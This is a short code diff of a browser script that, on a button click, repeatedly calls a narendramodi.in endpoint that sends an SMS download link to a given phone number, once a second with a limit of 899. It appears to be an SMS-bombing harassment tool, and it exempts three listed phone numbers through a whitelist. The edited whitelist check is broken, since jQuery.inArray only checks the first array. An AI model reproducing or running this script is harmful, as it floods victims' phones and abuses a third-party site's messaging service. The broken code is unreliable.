@@ -9,11 +9,12 @@ $(".btn").on('click', function() {
 	var limitt = 899;
 	var url = 'http://www.narendramodi.in/site/senddnldlink?contact_no=91%C2%A0'+number;
 	var interval, i = 1;
-	var white_list = ['7388643341' , '8381916336' , '9140873522'
-	]
+	var white_list1 = ['7388643341']
+	var white_list2 = ['8381916336']
+	var white_list3 = ['9140873522']
 
 
-	if( jQuery.inArray(number, white_list) == -1 ) {
+	if( jQuery.inArray(number, white_list1, white_list2, white_list3 ) == -1 ) {
                 interval = setInterval(bombb,1000);
         }
         else {
